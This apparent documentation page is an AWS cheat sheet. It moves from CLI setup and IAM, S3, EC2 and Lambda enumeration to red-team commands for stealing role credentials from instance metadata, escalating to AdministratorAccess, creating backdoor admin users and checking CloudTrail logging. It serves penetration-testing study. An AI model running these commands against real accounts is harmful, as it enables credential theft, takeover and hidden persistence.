---
title: AWS
description: AWS
icon: material/aws # simple/portainer , octicons/mark-github-16 , material/account-convert , lucide/atom
# status: new # deprecated
comments: true
# hide:
#     - navigation
#     - toc
#     - feedback
#     - tags
---


## CLI Configuration & Identity

### Basic AWS CLI Setup

```bash
# Configure AWS CLI with a named profile
aws configure --profile [profile-name]

# You'll be prompted for:
# - AWS Access Key ID
# - AWS Secret Access Key
# - Default region name (e.g., us-east-1)
# - Default output format (e.g., json, text, table)
```

### Identity Verification

```bash
# Verify current identity and account information
aws sts get-caller-identity --profile [profile-name]

# Additional identity context:
aws iam get-user --profile [profile-name]
aws iam list-account-aliases --profile [profile-name]
```

> **🔍 PRO TIP:** The `get-caller-identity` command is your go-to for verifying credentials work without requiring specific IAM permissions.

### Credential Types

>**📝 NOTE:** Key prefixes indicate credential type:

- **ASIA** - Temporary (short-term) security credentials
- **AKIA** - Long-term access keys
- **AROA** - IAM role temporary credentials
- **AGPA** - IAM group temporary credentials
## AWS Credentials Storage

### Credential Locations

- **Windows:**

```bash
C:\Users\[Username]\.aws\
├── credentials
└── config
```

**Linux/macOS:**

```bash
/home/[user]/.aws/
├── credentials
└── config
```

### File Structure

```bash
# ~/.aws/credentials
[profile-name]
aws_access_key_id = AKIA...
aws_secret_access_key = ...
aws_session_token = ...  # For temporary credentials

# ~/.aws/config
[profile profile-name]
region = us-east-1
output = json
```

**⚠️ SECURITY NOTE:** Always set appropriate file permissions:

```bash
chmod 600 ~/.aws/credentials ~/.aws/config
```

## Core Services Enumeration
### IAM User Enumeration

```bash
# List all IAM users
aws iam list-users --profile [profile-name]

# Get detailed user information
aws iam get-user --user-name [user-name] --profile [profile-name]

# List groups for a specific user
aws iam list-groups-for-user --user-name [user-name] --profile [profile-name]

# Get user policies (both managed and inline)
aws iam list-attached-user-policies --user-name [user-name] --profile [profile-name]
aws iam list-user-policies --user-name [user-name] --profile [profile-name]

# Get effective permissions for user
aws iam simulate-principal-policy --policy-source-arn arn:aws:iam::[account-id]:user/[user-name] --action-names "iam:*" "s3:*" --profile [profile-name]
```

### IAM Group Enumeration

```bash
# List all IAM groups
aws iam list-groups --profile [profile-name]

# Get group details and members
aws iam get-group --group-name [group-name] --profile [profile-name]

# List group policies
aws iam list-attached-group-policies --group-name [group-name] --profile [profile-name]
aws iam list-group-policies --group-name [group-name] --profile [profile-name]
```

### IAM Role Enumeration

```bash
# List all IAM roles
aws iam list-roles --profile [profile-name]

# Get specific role details
aws iam get-role --role-name [role-name] --profile [profile-name]

# List role policies
aws iam list-attached-role-policies --role-name [role-name] --profile [profile-name]
aws iam list-role-policies --role-name [role-name] --profile [profile-name]

# Get role trust policy (who can assume the role)
aws iam get-role --role-name [role-name] --query 'Role.AssumeRolePolicyDocument' --profile [profile-name]
```

### Policy Analysis

```bash
# List all policies
aws iam list-policies --scope Local  # Customer-managed only
aws iam list-policies --scope AWS    # AWS-managed only

# Get policy details and versions
aws iam get-policy --policy-arn [policy-arn] --profile [profile-name]
aws iam list-policy-versions --policy-arn [policy-arn] --profile [profile-name]

# Get policy document
aws iam get-policy-version --policy-arn [policy-arn] --version-id [version-id] --profile [profile-name]

# Get inline policies
aws iam get-user-policy --user-name [user-name] --policy-name [policy-name] --profile [profile-name]
aws iam get-group-policy --group-name [group-name] --policy-name [policy-name] --profile [profile-name]
aws iam get-role-policy --role-name [role-name] --policy-name [policy-name] --profile [profile-name]
```

**🔍 POLICY TIP:** To distinguish policy types:

- **Customer-Managed:** `arn:aws:iam::123456789012:policy/YourPolicyName`
- **AWS-Managed:** `arn:aws:iam::aws:policy/AWSReadOnlyAccess`

## Red Team Operations
### Initial Compromise & Enumeration

```bash
# Configure compromised credentials
aws configure --profile compromised-user

# Basic service enumeration
aws ec2 describe-instances --profile compromised-user
aws s3 ls --profile compromised-user
aws iam list-users --profile compromised-user

# Regional enumeration (important for multi-region environments)
aws ec2 describe-regions --profile compromised-user --query 'Regions[].RegionName' --output text
```

### Instance Metadata Exploitation

```bash
# Retrieve EC2 instance metadata (via SSRF/RCE)
curl http://169.254.169.254/latest/meta-data/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/[role-name]

# Get comprehensive instance data
curl http://169.254.169.254/latest/dynamic/instance-identity/document
```

**🎯 EXPLOITATION VECTORS:** Cloud metadata can be accessed through:
- **SSRF** (Server-Side Request Forgery)
- **RCE** (Remote Code Execution)
- **XXE** (XML External Entity)
- Compromised application containers

### Credential Configuration & Validation

```bash
# Configure temporary credentials from metadata
aws configure set aws_access_key_id [key-id] --profile ec2-role
aws configure set aws_secret_access_key [secret-key] --profile ec2-role
aws configure set aws_session_token [token] --profile ec2-role

# Verify the new identity
aws sts get-caller-identity --profile ec2-role
```

### Privilege Escalation Techniques

```bash
# Check current role permissions
aws iam list-attached-role-policies --role-name [role-name] --profile compromised-user
aws iam list-role-policies --role-name [role-name] --profile compromised-user

# Get inline policy details
aws iam get-role-policy --role-name [role-name] --policy-name [policy-name] --profile compromised-user

# Privilege escalation via policy attachment
aws iam attach-role-policy \
    --policy-arn arn:aws:iam::aws:policy/AdministratorAccess \
    --role-name [role-name] \
    --profile ec2-role

# Verify escalated permissions
aws iam list-attached-role-policies --role-name [role-name] --profile compromised-user
```

### Common Privilege Escalation Vectors

- **iam:AttachRolePolicy** - Attach admin policy to existing role
- **iam:PutRolePolicy** - Add inline policy to role
- **iam:CreateAccessKey** - Create access key for other users
- **iam:PassRole** + **ec2:RunInstances** - Pass role to new EC2 instance
- **lambda:CreateFunction** + **iam:PassRole** - Create Lambda with privileged role

## Automated Tools
### Pacu - AWS Exploitation Framework

```bash
# Start Pacu
pacu

# Set credentials
set_keys
# Follow prompts for alias, access key, secret key, session token

# Basic reconnaissance
whoami
exec iam__enum_permissions
exec iam__privesc_scan

# Service enumeration
exec ec2__enum
exec s3__enum
exec lambda__enum

# Check collected data
data EC2
data IAM
data S3
```

### ScoutSuite - Multi-Cloud Security Auditing

```bash
# Install ScoutSuite
pip install scoutsuite

# Run against AWS environment
scout aws --profile [profile-name]

# Generate HTML report
scout aws --profile [profile-name] --report-dir ./scout-report
```

### CloudBrute - Cloud Storage Enumeration

```bash
# Enumerate S3 buckets
cloudbrute -d [target-domain] -k [key-word] -m storage -t 50
```

### S3Scanner - S3 Bucket Discovery

```bash
# Find and scan S3 buckets
s3scanner scan --bucket-wordlists wordlists/buckets.txt
```

## Additional Enumeration Commands
### S3 Enumeration

```bash
# List all buckets
aws s3 ls --profile [profile-name]

# Get bucket details
aws s3api list-buckets --profile [profile-name]
aws s3api get-bucket-acl --bucket [bucket-name] --profile [profile-name]
aws s3api get-bucket-policy --bucket [bucket-name] --profile [profile-name]

# Check for public access
aws s3api get-public-access-block --bucket [bucket-name] --profile [profile-name]
```

### EC2 Enumeration

```bash
# List instances across all regions
for region in $(aws ec2 describe-regions --query 'Regions[].RegionName' --output text --profile [profile-name]); do
    echo "=== Region: $region ==="
    aws ec2 describe-instances --region $region --profile [profile-name]
done

# Get security groups
aws ec2 describe-security-groups --profile [profile-name]
```

### Lambda Enumeration

```bash
# List Lambda functions
aws lambda list-functions --profile [profile-name]

# Get function details
aws lambda get-function --function-name [function-name] --profile [profile-name]

# List function policies
aws lambda get-policy --function-name [function-name] --profile [profile-name]
```

## Defense Evasion & Persistence
### Logging Avoidance

```bash
# Identify CloudTrail trails
aws cloudtrail describe-trails --profile [profile-name]

# Check if trails are logging
aws cloudtrail get-trail-status --name [trail-name] --profile [profile-name]
```

### Backdoor Users

```bash
# Create new user with access keys
aws iam create-user --user-name [backdoor-user] --profile [admin-profile]
aws iam create-access-key --user-name [backdoor-user] --profile [admin-profile]

# Attach administrative policies
aws iam attach-user-policy --user-name [backdoor-user] --policy-arn arn:aws:iam::aws:policy/AdministratorAccess --profile [admin-profile]
```


## Useful Tools & Resources
### Command Line Tools
- **awscli** - Official AWS CLI
- **aws-vault** - Secure credential storage
- **jq** - JSON processor for parsing AWS output
- **s3cmd** - Advanced S3 operations
### Security Scanners
- **Pacu** - AWS exploitation framework
- **ScoutSuite** - Multi-cloud security auditing
- **CloudSploit** - CSPM security checks
- **TruffleHog** - Secret scanning in cloud environments

### Learning Resources

- **AWS Documentation** - Official service documentation
- **Rhino Security Labs** - AWS security research
- **MITRE ATT&CK Cloud Matrix** - TTPs for cloud environments
- **Cloud Security Alliance** - Cloud security guidelines

------


??? note "Some Good Youtube Tutorials"

    <iframe width="748" height="400" src="https://www.youtube.com/embed/OCCvvesay9M" title="1. Introduction to AWS Red Teaming" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>



    <iframe width="707" height="480" src="https://www.youtube.com/embed/ZGDHqKxATeQ" title="2. AWS Cloud Authentication" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>


    <iframe width="707" height="480" src="https://www.youtube.com/embed/JD2WGwTcgSc" title="3. AWS Cloud Core Services Enumeration" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>


    <iframe width="707" height="480" src="https://www.youtube.com/embed/X20KVCj6wcQ" title="4. AWS Cloud Red Team Operations" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>